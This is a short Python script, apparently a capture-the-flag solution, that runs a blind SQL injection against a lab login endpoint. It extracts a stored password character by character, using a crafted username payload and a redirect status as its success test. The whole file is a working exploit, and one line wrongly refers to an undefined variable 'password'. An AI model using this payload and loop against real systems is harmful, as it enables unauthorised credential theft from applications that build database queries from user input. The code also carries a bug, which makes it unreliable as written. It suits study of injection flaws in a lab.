import requests
import sys
import string

strings = string.ascii_letters + string.digits + '{}'
proxies = {"http":"127.0.0.1:8080"}
url = 'http://10.10.211.89:5000/challenge3/login'


flag = ""
# print(r.status_code)

for i in range(1,38):
	for c in strings:
		lol = i
		lol2 =hex(ord(c))[2:]
		username = "admin' AND SUBSTR((SELECT password from users LIMIT 0,1),"+str(lol)+",1) = CAST(X'"+str(lol2)+"' as TEXT)-- -"
		data = {"username": username, "password":"asdf"}
		r = requests.post(url, data=data,allow_redirects=False)
		sys.stdout.write("\r"+password+c)
		sys.stdout.flush()
		# print()
		# print(username)
		# print(lol)
		# print(lol2)
		# print(r.status_code)
		if(r.status_code==302):
			flag+=c
			break

print(flag)

